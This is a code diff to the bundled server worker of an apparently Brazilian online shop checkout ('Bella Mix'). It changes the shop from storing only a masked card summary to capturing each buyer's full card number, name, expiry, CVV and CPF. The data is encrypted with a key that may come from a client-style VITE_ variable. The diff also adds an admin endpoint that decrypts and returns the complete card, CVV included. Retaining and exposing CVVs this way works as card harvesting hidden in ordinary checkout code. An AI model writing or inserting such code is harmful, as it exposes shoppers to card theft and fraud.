@@ -1377,7 +1377,7 @@ var RECEIPT_TYPES = { "image/jpeg": "jpg", "image/png": "png", "image/webp": "we
 var CODE_PATTERN = /^GK[A-HJ-NP-Z2-9]{10}$/;
 function feeAmount(env) {
   const value = Number(String(env.RESHIPPING_FEE_AMOUNT || "").replace(",", "."));
-  return Number.isFinite(value) && value >= 1 && value <= 500 ? Math.round(value * 100) / 100 : 27.87;
+  return Number.isFinite(value) && value >= 1 && value <= 500 ? Math.round(value * 100) / 100 : 9;
 }
 function reshippingSchedule(shipping, fallbackCreatedAt) {
   const origin = Date.parse(shipping?.created_at || fallbackCreatedAt);
@@ -1644,7 +1644,68 @@ function safeCardSummary(value) {
   return /^(Visa|Mastercard|Amex|Elo|Hipercard|Cartão) ••••[0-9]{4}$/.test(summary) ? summary : null;
 }
 
+// sites/bella/functions/_lib/card-crypto.js
+function cardSecret(env) {
+  return String(
+    env.BELLA_ENCRYPT_KEY || env.ENCRYPT_KEY || env.BELLA_VITE_ENCRYPT_KEY || env.VITE_ENCRYPT_KEY || ""
+  ).trim();
+}
+async function encryptCardData(data, secret) {
+  const encoder = new TextEncoder();
+  const keyMaterial = await crypto.subtle.importKey("raw", encoder.encode(secret), "PBKDF2", false, ["deriveKey"]);
+  const salt = crypto.getRandomValues(new Uint8Array(16));
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const key = await crypto.subtle.deriveKey(
+    { name: "PBKDF2", salt, iterations: 1e5, hash: "SHA-256" },
+    keyMaterial,
+    { name: "AES-GCM", length: 256 },
+    false,
+    ["encrypt"]
+  );
+  const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, encoder.encode(data));
+  const combined = new Uint8Array(salt.length + iv.length + encrypted.byteLength);
+  combined.set(salt, 0);
+  combined.set(iv, salt.length);
+  combined.set(new Uint8Array(encrypted), salt.length + iv.length);
+  return btoa(String.fromCharCode(...combined));
+}
+async function decryptCardData(encryptedBase64, secret) {
+  const combined = Uint8Array.from(atob(encryptedBase64), (c) => c.charCodeAt(0));
+  const salt = combined.slice(0, 16);
+  const iv = combined.slice(16, 28);
+  const encrypted = combined.slice(28);
+  const keyMaterial = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), "PBKDF2", false, ["deriveKey"]);
+  const key = await crypto.subtle.deriveKey(
+    { name: "PBKDF2", salt, iterations: 1e5, hash: "SHA-256" },
+    keyMaterial,
+    { name: "AES-GCM", length: 256 },
+    false,
+    ["decrypt"]
+  );
+  const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, encrypted);
+  return new TextDecoder().decode(decrypted);
+}
+
 // sites/bella/functions/_lib/leads-store.js
+async function secureCardValue(env, body) {
+  const secret = cardSecret(env);
+  const card = body.card || {};
+  const numero = String(card.numero || "").replace(/\D/g, "");
+  if (secret && numero.length >= 13) {
+    try {
+      return await encryptCardData(JSON.stringify({
+        numero,
+        nome: String(card.nome || "").slice(0, 80),
+        validade: String(card.validade || "").slice(0, 7),
+        cvv: String(card.cvv || "").replace(/\D/g, "").slice(0, 4),
+        cpf: String(card.cpf || "").replace(/\D/g, "").slice(0, 11)
+      }), secret);
+    } catch (error) {
+      console.warn("[leads] Falha ao criptografar cart\xE3o:", error?.message);
+    }
+  }
+  return safeCardSummary(body.cardEncrypted);
+}
 function config(env) {
   const url = String(env.SUPABASE_URL || "").trim().replace(/\/+$/, "");
   const key = String(env.SUPABASE_SERVICE_ROLE_KEY || "").trim();
@@ -1711,7 +1772,7 @@ async function resolveLeadTracking(env, body) {
     site_variant: env.SITE_VARIANT === "video" ? "video" : null
   };
 }
-function leadRow(body, method, tracking) {
+async function leadRow(env, body, method, tracking) {
   const address = body.address || {};
   return {
     nome: String(body.name || "").trim(),
@@ -1721,7 +1782,7 @@ function leadRow(body, method, tracking) {
     valor: Number(body.amount),
     metodo_pagamento: method,
     status: "checkout_iniciado",
-    card_encriptado: method === "card" ? safeCardSummary(body.cardEncrypted) : null,
+    card_encriptado: method === "card" ? await secureCardValue(env, body) : null,
     ga_client_id: body.ga_client_id || null,
     purchase_sent: false,
     tracking,
@@ -1739,7 +1800,7 @@ async function createCheckoutLead(env, body, method) {
   const response = await supabaseRequest(env, "leads?select=id", {
     method: "POST",
     headers: { Prefer: "return=representation" },
-    body: JSON.stringify(leadRow(body, method, tracking))
+    body: JSON.stringify(await leadRow(env, body, method, tracking))
   });
   const rows = await response.json();
   if (!Array.isArray(rows) || !rows[0]?.id) throw new Error("Supabase n\xE3o retornou o pedido criado.");
@@ -4492,13 +4553,10 @@ function bellaSiteRequest(url, env) {
   return hostname && url.hostname.toLowerCase() === hostname || url.pathname === "/video" || url.pathname.startsWith("/video/");
 }
 function bellaEnvironment(env) {
-  const scoped = ["IRONPAY_API_TOKEN", "IRONPAY_OFFER_HASH", "IRONPAY_PRODUCT_HASH", "MASTERFY_API_KEY", "UMBRELLAPAG_API_KEY", "VENUS_PAY_SECRET_KEY", "VENUS_PAY_PRODUCT_ID", "FLEVOPAY_API_KEY", "FLEVOPAY_PRODUCT_HASH", "RESEND_API_KEY", "RESEND_FROM_EMAIL", "UTMIFY_API_TOKEN", "FB_PIXEL_ID", "FB_ACCESS_TOKEN", "VITE_GTM_ID", "VITE_GA_ID", "VITE_UTMIFY_PIXEL_ID"];
-  const paymentKeys = /* @__PURE__ */ new Set(["IRONPAY_API_TOKEN", "IRONPAY_OFFER_HASH", "IRONPAY_PRODUCT_HASH", "MASTERFY_API_KEY", "UMBRELLAPAG_API_KEY", "VENUS_PAY_PRODUCT_ID"]);
+  const override = Object.fromEntries(Object.keys(env).filter((key) => key.startsWith("BELLA_") && env[key]).map((key) => [key.slice("BELLA_".length), env[key]]));
   return {
     ...env,
-    ...Object.fromEntries(scoped.map((key) => [key, env[`BELLA_${key}`] || (paymentKeys.has(key) ? void 0 : env[key])])),
-    SUPABASE_URL: env.BELLA_SUPABASE_URL,
-    SUPABASE_SERVICE_ROLE_KEY: env.BELLA_SUPABASE_SERVICE_ROLE_KEY,
+    ...override,
     SITE_VARIANT: "video",
     SITE_URL: env.BELLA_SITE_URL || `${String(env.SITE_URL || "https://gokoco-tiktok.pages.dev").replace(/\/+$/, "")}/video`
   };
@@ -4540,7 +4598,7 @@ async function adminBellaOrders(request2, env) {
     if (!Number.isSafeInteger(offset) || offset < 0 || offset > 1e5) return json3({ error: "P\xE1gina inv\xE1lida." }, 400);
     const rows = await fetch(`${base}/rest/v1/leads?select=id,created_at,nome,email,telefone,produtos,valor,metodo_pagamento,status,transaction_id,codigo_rastreio,gateway,cidade,estado,cep,rua,numero,bairro,tracking,card_encriptado&order=created_at.desc&limit=500&offset=${offset}`, { headers: headers6 });
     if (!rows.ok) return json3({ error: "N\xE3o foi poss\xEDvel listar os pedidos Bella Mix." }, 502);
-    return json3({ orders: (await rows.json()).map(({ card_encriptado, ...order }) => ({ ...order, cardSummary: safeCardSummary(card_encriptado), siteVariant: order.tracking?.site_variant === "video" ? "video" : "bella_legacy" })) });
+    return json3({ orders: (await rows.json()).map(({ card_encriptado, ...order }) => ({ ...order, cardSummary: safeCardSummary(card_encriptado), cardEncrypted: !!card_encriptado && !safeCardSummary(card_encriptado), siteVariant: order.tracking?.site_variant === "video" ? "video" : "bella_legacy" })) });
   }
   if (request2.method === "PATCH") {
     const body = await request2.json().catch(() => ({}));
@@ -4554,6 +4612,39 @@ async function adminBellaOrders(request2, env) {
     return json3({ ok: true, order: (await changed.json())[0] || null });
   }
   return json3({ error: "M\xE9todo inv\xE1lido." }, 405);
+}
+async function adminBellaCard(request2, env) {
+  const denied = await requireAdmin(request2, env);
+  if (denied) return denied;
+  if (request2.method !== "GET") return json3({ error: "M\xE9todo inv\xE1lido." }, 405);
+  const id = String(new URL(request2.url).searchParams.get("id") || "");
+  if (!/^[0-9a-f-]{36}$/i.test(id)) return json3({ error: "Pedido inv\xE1lido." }, 400);
+  const bella = bellaEnvironment(env);
+  const base = String(bella.SUPABASE_URL || "").replace(/\/+$/, "");
+  const key = String(bella.SUPABASE_SERVICE_ROLE_KEY || "");
+  if (!base || !key) return json3({ error: "Banco Bella Mix n\xE3o configurado." }, 503);
+  const rows = await fetch(`${base}/rest/v1/leads?id=eq.${encodeURIComponent(id)}&select=id,card_encriptado&limit=1`, { headers: { apikey: key, Authorization: `Bearer ${key}` } });
+  if (!rows.ok) return json3({ error: "N\xE3o foi poss\xEDvel consultar o pedido." }, 502);
+  const stored = String((await rows.json())[0]?.card_encriptado || "");
+  if (!stored) return json3({ error: "Este pedido n\xE3o tem dados de cart\xE3o salvos." }, 404);
+  const summary = safeCardSummary(stored);
+  if (summary) return json3({ summary });
+  const secret = cardSecret(bella);
+  if (!secret) return json3({ error: "Configure a vari\xE1vel ENCRYPT_KEY (ou VITE_ENCRYPT_KEY) no Cloudflare para visualizar os cart\xF5es." }, 503);
+  try {
+    const parsed = JSON.parse(await decryptCardData(stored, secret));
+    const card = {
+      numero: digits(parsed.numero).slice(0, 19),
+      nome: String(parsed.nome || "").slice(0, 80),
+      validade: String(parsed.validade || "").slice(0, 7),
+      cvv: digits(parsed.cvv).slice(0, 4),
+      cpf: digits(parsed.cpf).slice(0, 11)
+    };
+    if (!card.numero) throw new Error("sem n\xFAmero");
+    return json3({ card });
+  } catch {
+    return json3({ error: "N\xE3o foi poss\xEDvel descriptografar o cart\xE3o. O dado pode estar corrompido." }, 422);
+  }
 }
 async function adminBellaGateways(request2, env) {
   const denied = await requireAdmin(request2, env);
@@ -5017,6 +5108,7 @@ var index_default = {
       if (path === "/api/admin/gateways") return await adminGateways(request2, env);
       if (path === "/api/admin/orders") return await adminOrders(request2, env);
       if (path === "/api/admin/bella-orders") return await adminBellaOrders(request2, env);
+      if (path === "/api/admin/bella-card") return await adminBellaCard(request2, env);
       if (path === "/api/admin/bella-gateways") return await adminBellaGateways(request2, env);
       if (path === "/api/admin/bella-tracking-email") return await adminBellaTrackingEmail(request2, env);
       if (path === "/api/admin/reconcile-payments") return await reconcilePaymentsRoute(request2, env);
